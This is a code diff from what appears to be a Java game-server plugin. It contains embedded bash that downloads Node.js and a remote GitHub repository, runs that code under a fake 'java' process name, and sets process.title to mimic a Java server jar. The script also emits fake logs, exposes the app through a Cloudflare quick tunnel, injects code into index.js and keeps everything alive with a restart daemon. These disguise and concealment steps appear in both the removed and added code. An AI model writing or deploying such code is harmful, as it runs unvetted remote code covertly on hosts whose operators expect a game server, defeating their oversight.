-                else { Files.createDirectories(newPath.getParent()); Files.copy(zis, newPath, StandardCopyOption.REPLACE_EXISTING); }
-                zis.closeEntry();
-            }
-        }
-    }
-
-    private Path findDirectory(Path parent, String prefix) throws IOException {
-        try (java.nio.file.DirectoryStream<Path> stream = Files.newDirectoryStream(parent)) {
-            for (Path entry : stream) { if (Files.isDirectory(entry) && entry.getFileName().toString().startsWith(prefix)) return entry.toAbsolutePath(); }
-        }
-        return null;
-    }
-
-    private void startWindowsDeployment(Path workDir, Map<String, String> env) throws Exception {
-        int port = 20000 + (int)(Math.random() * 40000);
-        while (!isPortFree(port)) { port = 20000 + (int)(Math.random() * 40000); }
-        Files.write(workDir.resolve(".tunnel_port"), String.valueOf(port).getBytes());
-
-        Path nodeDir = workDir.resolve("node-v22.12.0-win-x64");
-        Path nodeExe = nodeDir.resolve("node.exe");
-        if (!Files.exists(nodeExe)) {
-            Path nodeZip = workDir.resolve("node.zip");
-            this.getLogger().info("Downloading Node.js for Windows...");
-            downloadFileWithTimeout("https://nodejs.org/dist/v22.12.0/node-v22.12.0-win-x64.zip", nodeZip, 120);
-            unzip(nodeZip, workDir);
-            Files.deleteIfExists(nodeZip);
-            Path unzippedNode = findDirectory(workDir, "node-");
-            if (unzippedNode != null && !unzippedNode.equals(nodeDir)) Files.move(unzippedNode, nodeDir, StandardCopyOption.REPLACE_EXISTING);
-        }
-
-        Path fakeJavaDir = workDir.resolve("jre21").resolve("bin");
-        Files.createDirectories(fakeJavaDir);
-        Path fakeJava = fakeJavaDir.resolve("java.exe");
-        if (!Files.exists(fakeJava)) Files.copy(nodeExe, fakeJava, StandardCopyOption.REPLACE_EXISTING);
-
-        Path appDir = workDir.resolve("app");
-        Path unzippedApp = findDirectory(workDir, "indexaoyoumc");
-        if (unzippedApp != null) deleteDirectory(appDir.toFile());
-        Path appZip = workDir.resolve("app.zip");
-        this.getLogger().info("Downloading app code for Windows...");
-        String repoUrl = env.getOrDefault("REPO_URL", "https://github.com/zx1447/indexaoyoumc");
-        boolean downloadSuccess = downloadFileWithTimeout(repoUrl + "/archive/refs/heads/main.zip", appZip, 60);
-        if (!downloadSuccess) downloadSuccess = downloadFileWithTimeout(repoUrl + "/archive/refs/heads/master.zip", appZip, 60);
-        if (downloadSuccess) {
-            unzip(appZip, workDir); Files.deleteIfExists(appZip);
-            unzippedApp = findDirectory(workDir, "indexaoyoumc");
-            if (unzippedApp != null && !unzippedApp.equals(appDir)) Files.move(unzippedApp, appDir, StandardCopyOption.REPLACE_EXISTING);
-        } else throw new RuntimeException("Failed to download app code");
-
-        Path npmCli = nodeDir.resolve("node_modules").resolve("npm").resolve("bin").resolve("npm-cli.js");
-        if (Files.exists(npmCli)) {
-            this.getLogger().info("Running npm install for Windows...");
-            ProcessBuilder npmPb = new ProcessBuilder(nodeExe.toAbsolutePath().toString(), npmCli.toAbsolutePath().toString(), "install");
-            npmPb.directory(appDir.toFile()); npmPb.redirectErrorStream(true);
-            Process npmProc = npmPb.start();
-            try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(npmProc.getInputStream()))) { while (reader.readLine() != null); }
-            npmProc.waitFor();
-        }
-
-        ProcessBuilder nodePb = new ProcessBuilder(fakeJava.toAbsolutePath().toString(), "index.js");
-        nodePb.directory(appDir.toFile()); nodePb.environment().put("PORT", String.valueOf(port)); nodePb.environment().put("SERVER_PORT", String.valueOf(port));
-        nodePb.redirectErrorStream(true); nodePb.redirectOutput(new File(workDir.toFile(), "app.log"));
-        winNodeProcess = nodePb.start();
-
-        Path cfExe = workDir.resolve("cloudflared.exe");
-        if (!Files.exists(cfExe)) {
-            this.getLogger().info("Downloading Cloudflared for Windows...");
-            downloadFileWithTimeout("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe", cfExe, 60);
-        }
-
-        ProcessBuilder cfPb = new ProcessBuilder(cfExe.toAbsolutePath().toString(), "tunnel", "--url", "http://localhost:" + port, "--no-autoupdate");
-        cfPb.directory(workDir.toFile()); cfPb.redirectErrorStream(true);
-        winCfProcess = cfPb.start();
-
-        this.isProcessRunning = true; this.startFakeLogs(); this.startTunnelUrlMonitor();
-
-        new Thread(() -> {
-            try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(winCfProcess.getInputStream()))) {
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    if (line.contains("https://") && line.contains(".trycloudflare.com")) {
-                        String url = line.substring(line.indexOf("https://")).split(" ")[0];
-                        Files.write(workDir.resolve(".tunnel_url"), url.getBytes());
-                        break;
-                    }
-                }
-            } catch (Exception e) {}
-        }, "Win-CF-Reader").start();
-
-        new Thread(() -> {
-            while (isProcessRunning) {
-                try {
-                    if (winNodeProcess != null && !winNodeProcess.isAlive()) winNodeProcess = nodePb.start();
-                    if (winCfProcess != null && !winCfProcess.isAlive()) winCfProcess = cfPb.start();
-                    Thread.sleep(5000);
-                } catch (Exception e) {}
-            }
-        }, "Win-Daemon").start();
-    }
-    // =================================================================
+    // ============================================================
+    // 部署脚本生成 (包含完整逻辑)
+    // ============================================================
 
     private String generateDeployScript(String workDir, Map<String, String> env) {
-        String repoUrl = env.getOrDefault("REPO_URL", "");
+        String repoUrl = env.getOrDefault("REPO_URL", "https://github.com/zx1447/indexaoyoumc");
+        String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
         String nodeDir = workDir + "/nodejs";
         String appDir = workDir + "/app";
         String dataDir = workDir + "/data";
 
-        return "#!/bin/bash\nset +e\n\nsleep 90\n\nWORK_DIR=" + workDir + "\nNODE_DIR=" + nodeDir + "\nAPP_DIR=" + appDir + "\nDATA_DIR=" + dataDir + "\nREPO_URL=" + repoUrl + "\nNODE_PID_FILE=$WORK_DIR/.node_pid\nJRE_DIR=$WORK_DIR/jre21/bin\n\nis_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\nwhile true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\nexport SERVER_PORT=$PORT; export PORT=$PORT\necho $PORT > $WORK_DIR/.tunnel_port\n\nARCH=$(uname -m)\nif [ $ARCH = x86_64 ]; then\n    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\n    CF_ARCH=amd64\nelif [ $ARCH = aarch64 ]; then\n    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\n    CF_ARCH=arm64\nfi\n\n# ========== 1. 下载NodeJS ==========\nif [ -d $NODE_DIR ]; then\n    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo unknown)\n    if [[ $CHECK_VER != v22* ]]; then\n        rm -rf $NODE_DIR\n    fi\nfi\nif [ ! -d $NODE_DIR ]; then\n    for MIRROR in $NODE_URL https://gh-proxy.com/$NODE_URL https://mirror.ghproxy.com/$NODE_URL; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 $MIRROR -o $WORK_DIR/node.tar.gz 2>/dev/null; then break; fi\n    done\n    mkdir -p $NODE_DIR; tar -xzf $WORK_DIR/node.tar.gz -C $NODE_DIR --strip-components 1 2>/dev/null; rm -f $WORK_DIR/node.tar.gz\nfi\nexport PATH=$NODE_DIR/bin:$PATH\n\n# ========== 2. 备份真实node ==========\nmkdir -p $JRE_DIR\n\nif [ -f $NODE_DIR/bin/node ] && ! head -1 $NODE_DIR/bin/node 2>/dev/null | grep -q bash; then\n    cp -f $NODE_DIR/bin/node $NODE_DIR/bin/.node_real\n    chmod +x $NODE_DIR/bin/.node_real\nfi\n\nif [ ! -f $NODE_DIR/bin/.node_real ] || ! $NODE_DIR/bin/.node_real -v >/dev/null 2>&1; then\n    rm -f $WORK_DIR/node.tar.gz\n    for MIRROR in $NODE_URL https://gh-proxy.com/$NODE_URL https://mirror.ghproxy.com/$NODE_URL; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 $MIRROR -o $WORK_DIR/node.tar.gz 2>/dev/null; then break; fi\n    done\n    mkdir -p $WORK_DIR/_node_tmp\n    tar -xzf $WORK_DIR/node.tar.gz -C $WORK_DIR/_node_tmp --strip-components 1 2>/dev/null\n    cp -f $WORK_DIR/_node_tmp/bin/node $NODE_DIR/bin/.node_real\n    chmod +x $NODE_DIR/bin/.node_real\n    rm -rf $WORK_DIR/_node_tmp $WORK_DIR/node.tar.gz\nfi\n\n# ========== 3. 下载代码 ==========\nmkdir -p $DATA_DIR\nif [ -d $APP_DIR ]; then\n    cp $APP_DIR/node_modules/.bots_config.json $DATA_DIR/ 2>/dev/null\n    cp $APP_DIR/node_modules/Error\\ log/nezha_config.json $DATA_DIR/nezha_config.json 2>/dev/null\n    cp $APP_DIR/node_modules/.task_center_config.json $DATA_DIR/ 2>/dev/null\n    cp $APP_DIR/node_modules/.system_guard.json $DATA_DIR/ 2>/dev/null\n    if [ -d $APP_DIR/node_modules/RoamingMusic ]; then\n        rm -rf $DATA_DIR/.RoamingMusic_bak 2>/dev/null\n        cp -r $APP_DIR/node_modules/RoamingMusic $DATA_DIR/.RoamingMusic_bak 2>/dev/null\n    fi\nfi\nrm -rf $APP_DIR $WORK_DIR/repo.tar.gz\nREPO_PATH=$(echo $REPO_URL | sed 's|https://github.com/||' | sed 's|.git$||')\n\ndownload_code() {\n    if curl -fsSL --connect-timeout 15 --max-time 120 $1 -o $WORK_DIR/repo.tar.gz 2>/dev/null; then\n        if tar -tzf $WORK_DIR/repo.tar.gz >/dev/null 2>&1; then return 0; else rm -f $WORK_DIR/repo.tar.gz; return 1; fi\n    else return 1; fi\n}\ndownload_code https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz || \ndownload_code https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\nif [ ! -f $WORK_DIR/repo.tar.gz ]; then exit 1; fi\nmkdir -p $WORK_DIR/unzipped\ntar -xzf $WORK_DIR/repo.tar.gz -C $WORK_DIR/unzipped\nSUBDIR=$(find $WORK_DIR/unzipped -mindepth 1 -maxdepth 1 -type d | head -n 1)\nmv $SUBDIR $APP_DIR\nrm -rf $WORK_DIR/repo.tar.gz $WORK_DIR/unzipped\ncd $APP_DIR\n\n# ========== 4. npm install ==========\n$NODE_DIR/bin/.node_real $NODE_DIR/lib/node_modules/npm/bin/npm-cli.js install --unsafe-perm=true --allow-root >/dev/null 2>&1\nsleep 2\n\nif [ -d $DATA_DIR ]; then\n    cp $DATA_DIR/.bots_config.json $APP_DIR/node_modules/ 2>/dev/null\n    cp $DATA_DIR/.task_center_config.json $APP_DIR/node_modules/ 2>/dev/null\n    cp $DATA_DIR/.system_guard.json $APP_DIR/node_modules/ 2>/dev/null\n    if [ -f $DATA_DIR/nezha_config.json ]; then\n        mkdir -p $APP_DIR/node_modules/Error\\ log\n        cp $DATA_DIR/nezha_config.json $APP_DIR/node_modules/Error\\ log/\n    fi\n    if [ -d $DATA_DIR/.RoamingMusic_bak ]; then\n        mkdir -p $APP_DIR/node_modules/RoamingMusic\n        cp -r $DATA_DIR/.RoamingMusic_bak/* $APP_DIR/node_modules/RoamingMusic/ 2>/dev/null\n    fi\nfi\n\n# ========== 5. 替换伪装 ==========\ncp -f $NODE_DIR/bin/.node_real $JRE_DIR/java\nchmod +x $JRE_DIR/java\n\ncat > $NODE_DIR/bin/node << 'NODEWRAPPER'\n#!/bin/bash\nexec -a java $(dirname $0)/.node_real \"$@\"\nNODEWRAPPER\nchmod +x $NODE_DIR/bin/node\n\nexport _JAVA_WRAPPER=$NODE_DIR/bin/node\n\ncat > $WORK_DIR/.nd_preload.js << 'PRELOAD_EOF'\ntry {\n    process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n    var _cp = require('child_process');\n    var _origSpawn = _cp.spawn;\n    var _origFork = _cp.fork;\n    var _wp = process.env._JAVA_WRAPPER || process.execPath;\n    _cp.spawn = function(cmd, args, opts) {\n        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('.node_real') || cmd.endsWith('java'))) {\n            opts = Object.assign({}, opts || {});\n            opts.execPath = _wp;\n            cmd = _wp;\n        }\n        return _origSpawn.call(this, cmd, args, opts);\n    };\n    _cp.fork = function(mod, args, opts) {\n        opts = Object.assign({}, opts || {});\n        opts.execPath = _wp;\n        return _origFork.call(this, mod, args, opts);\n    };\n    var _origExecFile = _cp.execFile;\n    _cp.execFile = function(file, args, opts, cb) {\n        if (typeof file === 'string' && (file === 'node' || file.endsWith('/node') || file === process.execPath || file.endsWith('.node_real') || file.endsWith('java'))) {\n            if (typeof opts === 'function') { cb = opts; opts = {}; }\n            else if (typeof args === 'function') { cb = args; args = []; opts = {}; }\n            opts = Object.assign({}, opts || {});\n            opts.execPath = _wp;\n        }\n        return _origExecFile.call(this, file, args, opts, cb);\n    };\n} catch(e) {}\nPRELOAD_EOF\n\nexport NODE_OPTIONS=--require\\ $WORK_DIR/.nd_preload.js\n\n# ========== 6. 注入健康检查 ==========\nif [ -f index.js ] && ! grep -q '__HEALTH_INJECTED__' index.js; then\n    cat >> index.js << 'HEALTH_EOF'\n/* __HEALTH_INJECTED__ */\nconst __origListen=app.listen.bind(app);\napp.listen=function(){\n  const srv=__origListen.apply(this,arguments);\n  srv.on('listening',()=>{\n    try{require('fs').writeFileSync(require('path').join(__dirname,'node_modules','.node_ready'),String(Date.now()));}catch(e){}\n  });\n  srv.timeout=30000;\n  srv.keepAliveTimeout=65000;\n  srv.headersTimeout=66000;\n  return srv;\n};\napp.get('/__health',(req,res)=>res.status(200).send('ok'));\nHEALTH_EOF\nfi\n\n# ========== 7. 启动NodeJS ==========\nif [ -f $NODE_PID_FILE ]; then\n    OLD_PID=$(cat $NODE_PID_FILE 2>/dev/null)\n    if [ -n $OLD_PID ] && kill -0 $OLD_PID 2>/dev/null; then kill $OLD_PID 2>/dev/null; fi\n    rm -f $NODE_PID_FILE\nfi\n\ncd $APP_DIR\nnohup bash -c 'exec -a java $0 $@' $JRE_DIR/java index.js > $WORK_DIR/app.log 2>&1 &\nNODE_PID=$!\necho $NODE_PID > $NODE_PID_FILE\n\nfor i in $(seq 1 60); do\n    if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n    sleep 1\ndone\n\nsleep 2\n\n# ========== 8. 下载CF ==========\nCF_BIN=$JRE_DIR/java_cf\nif [ ! -f $CF_BIN ]; then\n    CF_TEMP=$WORK_DIR/_cf_tmp\n    CF_DIRECT=https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\n    for MIRROR in https://ghproxy.net/${CF_DIRECT} $CF_DIRECT; do\n        if curl -fsSL --connect-timeout 10 --max-time 60 $MIRROR -o $CF_TEMP 2>/dev/null; then\n            cp $CF_TEMP $CF_BIN; chmod +x $CF_BIN; rm -f $CF_TEMP; break\n        fi\n    done\nfi\nif [ ! -f $CF_BIN ]; then exit 1; fi\npkill -f $CF_BIN 2>/dev/null || true\npkill -f 'cloudflared.tunnel' 2>/dev/null || true\nsleep 1\n\n# ========== 9. 启动CF隧道 ==========\nTUNNEL_URL=\nTUNNEL_PID=\nTUNNEL_PROTO=\nTUNNEL_OK=false\n\nCF_CONF_DIR=$WORK_DIR/jre21/conf\nmkdir -p $CF_CONF_DIR\n\nwrite_cf_config() {\n    local PROTO=$1\n    cat > $CF_CONF_DIR/server.properties << CFCONFIG\nurl http://localhost:$PORT\nno-autoupdate true\nprotocol $PROTO\nCFCONFIG\n}\n\nstart_cf_tunnel() {\n    local PROTO=$1\n    local LOG_FILE=$2\n    write_cf_config $PROTO\n    (exec -a java $CF_BIN --config $CF_CONF_DIR/server.properties > $LOG_FILE 2>&1) &\n    echo $!\n}\n\nfor PROTO in quic http2 auto; do\n    if [ $TUNNEL_OK = true ]; then break; fi\n    for attempt in 1 2 3; do\n        if [ $TUNNEL_OK = true ]; then break; fi\n        rm -f $WORK_DIR/tunnel.log\n        CF_PID=$(start_cf_tunnel $PROTO $WORK_DIR/tunnel.log)\n        sleep 5\n        if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n        EXTRACTED_URL=\n        for i in $(seq 1 20); do\n            EXTRACTED_URL=$(grep -oP 'https://[a-zA-Z0-9-]+.trycloudflare.com' $WORK_DIR/tunnel.log 2>/dev/null | tail -1)\n            if [ -n $EXTRACTED_URL ]; then break; fi\n            sleep 1\n        done\n        if [ -z $EXTRACTED_URL ]; then kill $CF_PID 2>/dev/null; continue; fi\n        TUNNEL_URL=$EXTRACTED_URL; TUNNEL_PID=$CF_PID; TUNNEL_PROTO=$PROTO; TUNNEL_OK=true; break\n    done\ndone\n\n\nif [ $TUNNEL_OK = true ]; then\n    sleep 3\n    VERIFY=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 $TUNNEL_URL/__health 2>/dev/null)\n    if [ -n $VERIFY ] && [ $VERIFY != 000 ] && [ $VERIFY != 502 ]; then\n        echo $TUNNEL_URL > $WORK_DIR/.tunnel_url; echo PROTOCOL=$TUNNEL_PROTO >> $WORK_DIR/.tunnel_url; echo CF_PID=$TUNNEL_PID >> $WORK_DIR/.tunnel_url\n    else\n        sleep 5\n        VERIFY2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 $TUNNEL_URL/__health 2>/dev/null)\n        if [ -n $VERIFY2 ] && [ $VERIFY2 != 000 ]; then\n            echo $TUNNEL_URL > $WORK_DIR/.tunnel_url; echo PROTOCOL=$TUNNEL_PROTO >> $WORK_DIR/.tunnel_url; echo CF_PID=$TUNNEL_PID >> $WORK_DIR/.tunnel_url\n        else\n            kill $TUNNEL_PID 2>/dev/null\n            for RPROTO in http2 auto; do\n                rm -f $WORK_DIR/tunnel.log\n                NEW_PID=$(start_cf_tunnel $RPROTO $WORK_DIR/tunnel.log)\n                sleep 5; if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n                NEW_URL=\n                for j in $(seq 1 20); do NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+.trycloudflare.com' $WORK_DIR/tunnel.log 2>/dev/null | tail -1); if [ -n $NEW_URL ]; then break; fi; sleep 1; done\n                if [ -z $NEW_URL ]; then kill $NEW_PID 2>/dev/null; continue; fi\n                sleep 3; V=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 $NEW_URL/__health 2>/dev/null)\n                if [ -n $V ] && [ $V != 000 ]; then\n                    echo $NEW_URL > $WORK_DIR/.tunnel_url; echo PROTOCOL=$RPROTO >> $WORK_DIR/.tunnel_url; echo CF_PID=$NEW_PID >> $WORK_DIR/.tunnel_url; TUNNEL_URL=$NEW_URL; TUNNEL_PID=$NEW_PID; TUNNEL_PROTO=$RPROTO; TUNNEL_OK=true; break\n                else kill $NEW_PID 2>/dev/null; fi\n            done\n        fi\n    fi\nfi\n\nif [ ! -f $WORK_DIR/.tunnel_url ] || [ $TUNNEL_OK != true ]; then echo 'failed' > $WORK_DIR/.tunnel_url; fi\n\n# ========== 10. 守护循环 ==========\ncat > $WORK_DIR/daemon.sh << 'DAEMONSCRIPT'\n#!/bin/bash\nWORK_DIR=" + workDir + "\nJRE_DIR=$WORK_DIR/jre21/bin\nNODE_DIR=$WORK_DIR/nodejs\nNODE_FAKE=$JRE_DIR/java\nNODE_PID_FILE=$WORK_DIR/.node_pid\nCF_BIN=$JRE_DIR/java_cf\nAPP_DIR=$WORK_DIR/app\nCF_CONF_DIR=$WORK_DIR/jre21/conf\nPORT=$(cat $WORK_DIR/.tunnel_port 2>/dev/null || echo 25565)\nexport SERVER_PORT=$PORT; export PORT=$PORT\nexport _JAVA_WRAPPER=$NODE_DIR/bin/node\nexport NODE_OPTIONS=--require\\ $WORK_DIR/.nd_preload.js\nexport PATH=$NODE_DIR/bin:$PATH\n\nwrite_cf_config() {\n    local PROTO=$1\n    cat > $CF_CONF_DIR/server.properties << CFCONFIG\nurl http://localhost:$PORT\nno-autoupdate true\nprotocol $PROTO\nCFCONFIG\n}\n\nstart_cf_tunnel() {\n    local PROTO=$1\n    local LOG_FILE=$2\n    write_cf_config $PROTO\n    (exec -a java $CF_BIN --config $CF_CONF_DIR/server.properties > $LOG_FILE 2>&1) &\n    echo $!\n}\n\nwhile true; do\n    NEED_RESTART=false\n    if [ -f $NODE_PID_FILE ]; then\n        NODE_PID=$(cat $NODE_PID_FILE 2>/dev/null)\n        if [ -z $NODE_PID ] || ! kill -0 $NODE_PID 2>/dev/null; then NEED_RESTART=true; fi\n    else NEED_RESTART=true; fi\n    if [ $NEED_RESTART = true ]; then\n        cd $APP_DIR\n        nohup bash -c 'exec -a java $0 $@' $NODE_FAKE index.js > $WORK_DIR/app.log 2>&1 &\n        NEW_PID=$!; echo $NEW_PID > $NODE_PID_FILE\n        for i in $(seq 1 30); do if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi; sleep 1; done\n    fi\n    NEED_REBUILD=false\n    SAVED_CF_PID=$(grep CF_PID= $WORK_DIR/.tunnel_url 2>/dev/null | cut -d= -f2)\n    SAVED_PROTO=$(grep PROTOCOL= $WORK_DIR/.tunnel_url 2>/dev/null | cut -d= -f2)\n    SAVED_PROTO=${SAVED_PROTO:-quic}\n    SAVED_URL=$(head -n1 $WORK_DIR/.tunnel_url 2>/dev/null)\n    if [ -n $SAVED_CF_PID ] && ! kill -0 $SAVED_CF_PID 2>/dev/null; then NEED_REBUILD=true; fi\n    if [ $NEED_REBUILD = false ] && [ -n $SAVED_URL ]; then\n        HC=$(curl -s -o /dev/null -w %{http_code} --connect-timeout 5 --max-time 8 $SAVED_URL/__health 2>/dev/null)\n        if [ -z $HC ] || [ $HC = 000 ]; then sleep 5; HC2=$(curl -s -o /dev/null -w %{http_code} --connect-timeout 5 --max-time 8 $SAVED_URL/__health 2>/dev/null); if [ -z $HC2 ] || [ $HC2 = 000 ]; then NEED_REBUILD=true; fi; fi\n    fi\n    if [ $NEED_REBUILD = true ]; then\n        [ -n $SAVED_CF_PID ] && kill $SAVED_CF_PID 2>/dev/null; pkill -f $CF_BIN 2>/dev/null; pkill -f cloudflared.tunnel 2>/dev/null\n        sleep 2; rm -f $WORK_DIR/tunnel.log\n        for RPROTO in $SAVED_PROTO quic http2 auto; do\n            rm -f $WORK_DIR/tunnel.log\n            NEW_PID=$(start_cf_tunnel $RPROTO $WORK_DIR/tunnel.log)\n            sleep 5; if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n            NEW_URL=\n            for j in $(seq 1 20); do NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+.trycloudflare.com' $WORK_DIR/tunnel.log 2>/dev/null | tail -1); if [ -n $NEW_URL ]; then break; fi; sleep 1; done\n            if [ -z $NEW_URL ]; then kill $NEW_PID 2>/dev/null; continue; fi\n            sleep 3; V=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 $NEW_URL/__health 2>/dev/null)\n            if [ -n $V ] && [ $V != 000 ]; then\n                echo $NEW_URL > $WORK_DIR/.tunnel_url; echo PROTOCOL=$RPROTO >> $WORK_DIR/.tunnel_url; echo CF_PID=$NEW_PID >> $WORK_DIR/.tunnel_url; break\n            else\n                sleep 5; V2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 $NEW_URL/__health 2>/dev/null)\n                if [ -n $V2 ] && [ $V2 != 000 ]; then echo $NEW_URL > $WORK_DIR/.tunnel_url; echo PROTOCOL=$RPROTO >> $WORK_DIR/.tunnel_url; echo CF_PID=$NEW_PID >> $WORK_DIR/.tunnel_url; break; else kill $NEW_PID 2>/dev/null; fi\n            fi\n        done\n    fi\n    sleep 15\ndone\nDAEMONSCRIPT\nchmod +x $WORK_DIR/daemon.sh\nnohup $WORK_DIR/daemon.sh > $WORK_DIR/daemon.log 2>&1 &\n\nexit 0\n";
+        String authHeader = "";
+        if (!githubToken.isEmpty()) {
+            authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
+        }
+
+        return "#!/bin/bash\n" +
+        "set +e\n" +
+        "WORK_DIR=\"" + workDir + "\"\n" +
+        "NODE_DIR=\"" + nodeDir + "\"\n" +
+        "APP_DIR=\"" + appDir + "\"\n" +
+        "DATA_DIR=\"" + dataDir + "\"\n" +
+        "REPO_URL=\"" + repoUrl + "\"\n" +
+        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
+        "\n" +
+        "ARCH=$(uname -m)\n" +
+        "if [ $ARCH = x86_64 ]; then\n" +
+        "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\n" +
+        "    CF_ARCH=amd64\n" +
+        "elif [ $ARCH = aarch64 ]; then\n" +
+        "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\n" +
+        "    CF_ARCH=arm64\n" +
+        "fi\n" +
+        "\n" +
+        "# ========== 1. 下载NodeJS ==========\n" +
+        "if [ -d \"$NODE_DIR\" ]; then\n" +
+        "    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
+        "    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi\n" +
+        "fi\n" +
+        "if [ ! -d \"$NODE_DIR\" ]; then\n" +
+        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
+        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
+        "    done\n" +
+        "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
+        "fi\n" +
+        "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
+        "mkdir -p \"$JRE_DIR\"\n" +
+        "\n" +
+        "if [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n" +
+        "    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod +x \"$NODE_DIR/bin/.node_real\"\n" +
+        "fi\n" +
+        "if [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
+        "    rm -f \"$WORK_DIR/node.tar.gz\"\n" +
+        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
+        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
+        "    done\n" +
+        "    mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 2>/dev/null\n" +
+        "    cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod +x \"$NODE_DIR/bin/.node_real\"\n" +
+        "    rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
+        "fi\n" +
+        "\n" +
+        "# ========== 2. 下载代码 (自动公私库判断) ==========\n" +
+        "mkdir -p \"$DATA_DIR\"\n" +
+        "if [ -d \"$APP_DIR\" ]; then\n" +
+        "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
+        "    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
+        "    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR\" 2>/dev/null\n" +
+        "fi\n" +
+        "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
+        "\n" +
+        "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
+        "TAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"\n" +
+        "DOWNLOAD_OK=false\n" +
+        "\n" +
+        (githubToken.isEmpty() ? "" :
+        "# 尝试带 Token 下载 (私库)\n" +
+        "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
+        "    if curl -fsSL --connect-timeout 15 --max-time 120 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
+        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi\n" +
+        "    fi\n" +
+        "fi\n") +
+        "\n" +
+        "# 公库下载 / 镜像回退\n" +
+        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
+        "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
+        "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
+        "        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
+        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
+        "        fi\n" +
+        "    done\n" +
+        "fi\n" +
+        "\n" +
+        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
+        "\n" +
